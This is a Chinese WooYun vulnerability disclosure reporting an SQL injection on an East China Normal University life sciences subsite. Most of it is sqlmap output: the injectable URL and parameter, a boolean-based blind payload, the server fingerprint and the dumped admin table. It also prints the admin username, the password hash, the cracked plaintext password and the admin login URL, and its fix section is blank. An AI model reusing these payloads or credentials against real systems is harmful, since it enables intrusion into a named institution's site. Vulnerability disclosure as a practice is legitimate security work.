wybug_title: 华东师范大学某子站存在SQL注入
wybug_detail:
漏洞详情 披露状态：   									2015-11-21：	细节已通知厂商并且等待厂商处理中									2015-11-23：	厂商已经确认，细节仅向厂商公开									2015-12-03：	细节向核心白帽子及相关领域专家公开									2015-12-13：	细节向普通白帽子公开									2015-12-23：	细节向实习白帽子公开									2016-01-11：	细节向公众公开  简要描述： 华东师范大学生命科学学院的教师预约存在sql注入 详细说明：  注入点hy1_id:biolab.ecnu.edu.cn/resources/roomres/hydetail.asp?hy1_id=19&hy_name=%CA%B5%D1%E9B%C2%A5511%BB%E1%D2%E9%CA%D2
sqlmap resumed the following injection point(s) from stored session:---Parameter: hy1_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: hy1_id=19 AND 3132=3132&hy_name=%CA%B5%D1%E9B%C2%A5511%BB%E1%D2%E9%CA%D2---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Accesssqlmap resumed the following injection point(s) from stored session:---Parameter: hy1_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: hy1_id=19 AND 3132=3132&hy_name=%CA%B5%D1%E9B%C2%A5511%BB%E1%D2%E9%CA%D2---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft AccessDatabase: Microsoft_Access_masterdbTable: admin[3 columns]+---------------+-------------+| Column        | Type        |+---------------+-------------+| adminpassword | non-numeric || adminuser     | non-numeric || id            | numeric     |+---------------+-------------+Database: Microsoft_Access_masterdbTable: admin[1 entry]+----+-----------+------------------+| id | adminuser | adminpassword    |+----+-----------+------------------+| 1  | admin     | d4ceeed4e7657af9 |+----+-----------+------------------+
解密：biolife登陆URL：http://biolab.ecnu.edu.cn/resources/roomres/admin/login.asp   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云
